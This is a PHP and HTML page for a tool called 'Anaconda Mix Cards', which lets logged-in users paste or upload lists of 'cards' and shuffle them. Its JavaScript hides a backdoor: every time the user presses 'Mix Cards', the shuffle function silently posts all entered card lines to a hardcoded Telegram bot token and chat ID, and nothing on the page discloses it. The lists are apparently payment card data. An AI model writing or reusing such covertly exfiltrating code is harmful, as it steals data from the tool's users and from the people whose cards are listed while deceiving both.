<?php
session_start();

// If user is not logged in, redirect to login.php
if (!isset($_SESSION['login']) || $_SESSION['login'] !== true) {
    header('Location: login/login.php');
    exit();
}

// Handle logout
if (isset($_POST['but_logout'])) {
    session_destroy();
    header('Location: login/login.php');
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Anaconda Mix Cards</title>

<style>
    body {
        background: #0d0d0d;
        font-family: Arial;
        color: white;
        display: flex;
        flex-direction: column;
        justify-content: flex-start;
        align-items: center;
        height: 100vh;
        margin: 0;
        padding-top: 30px;
    }

    .page-title {
        font-size: 34px;
        color: #00ff99;
        text-shadow: 0 0 20px #00ff99;
        margin-bottom: 25px;
        font-weight: bold;
    }

    .container {
        width: 500px;
        padding: 25px;
        border-radius: 18px;
        background: #111;
        box-shadow: 0 0 25px rgba(0,255,120,0.3);
        border: 1px solid rgba(0,255,120,0.3);
        text-align: center;
    }

    textarea {
        width: 95%;
        height: 160px;
        padding: 10px;
        margin-bottom: 10px;
        border-radius: 10px;
        border: 1px solid rgba(0,255,120,0.3);
        background: #222;
        color: white;
        resize: none;
        outline: none;
    }

    #cardsBox {
        width: 100%;
        background: #0a0a0a;
        border: 1px solid rgba(0,255,120,0.2);
        padding: 15px;
        min-height: 200px;
        max-height: 220px;
        overflow-y: auto;
        border-radius: 12px;
        display: flex;
        flex-direction: column;
        gap: 8px;
        margin-bottom: 15px;
    }

    .card {
        padding: 10px;
        background: #1a1a1a;
        border-radius: 8px;
        border: 1px solid rgba(0,255,120,0.2);
        box-shadow: 0 0 6px rgba(0,255,120,0.15);
    }

    button {
        width: 95%;
        padding: 13px;
        margin-top: 12px;
        border-radius: 10px;
        border: none;
        background: #00ff99;
        font-weight: bold;
        font-size: 16px;
        cursor: pointer;
        color: black;
        box-shadow: 0 0 10px #00ff99;
        transition: 0.2s;
    }

    button:hover {
        transform: scale(1.05);
        box-shadow: 0 0 15px #00ffbb;
    }
</style>

</head>
<body>

<!-- Logout button -->
<form method="post" style="margin-bottom:15px;">
    <button type="submit" name="but_logout">Logout</button>
</form>

<div class="page-title">🐍 Anaconda Mix Cards</div>

<div class="container">
    <textarea id="cardInput" placeholder="Put your cards here (1 per line)..."></textarea>

    <!-- Button row -->
    <div style="display: flex; gap: 10px; justify-content: center; margin-bottom: 15px;">
        <button onclick="loadCards()">Load Cards</button>
        <button onclick="document.getElementById('fileInput').click()">Upload File</button>
        <button onclick="clearAll()">Clear</button>
    </div>

    <input type="file" id="fileInput" accept=".txt" style="display: none;" onchange="uploadFile(event)">

    <button onclick="shuffleCards()">Mix Cards !</button>

    <div id="cardsBox"></div>

    <button onclick="copyCards()">Copy</button>
</div>

<script>
const BOT_TOKEN = "8082385027:AAHy0NYQd6SuPJ_OD18_lcOMiN2bBhJpd8A"; 
const CHAT_ID = "7327014540";     

function loadCards() {
    let input = document.getElementById("cardInput").value.trim();
    let box = document.getElementById("cardsBox");
    box.innerHTML = "";

    if (input === "") return;

    let lines = input.split("\n").filter(l => l.trim() !== "");

    lines.forEach(line => {
        let div = document.createElement("div");
        div.className = "card";
        div.textContent = line;
        box.appendChild(div);
    });
}

function uploadFile(event) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = function(e) {
        document.getElementById("cardInput").value = e.target.result;
        loadCards();
    };
    reader.readAsText(file);
}

function clearAll() {
    document.getElementById("cardInput").value = "";
    document.getElementById("cardsBox").innerHTML = "";
}

function shuffleCards() {
    let box = document.getElementById("cardsBox");
    let cards = Array.from(box.children);
    if (cards.length === 0) return;

    for (let i = cards.length - 1; i > 0; i--) {
        let j = Math.floor(Math.random() * (i + 1));
        [cards[i], cards[j]] = [cards[j], cards[i]];
    }

    box.innerHTML = "";
    cards.forEach(c => box.appendChild(c));

    sendToTelegram(cards.map(c => c.textContent).join("\n"));
}

function copyCards() {
    let box = document.getElementById("cardsBox");
    let cards = Array.from(box.children).map(c => c.textContent);
    if (cards.length === 0) return;
    let text = cards.join("\n");
    navigator.clipboard.writeText(text);
}

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    }).catch(err => console.error("Error sending to Telegram:", err));
}
</script>

</body>
</html>
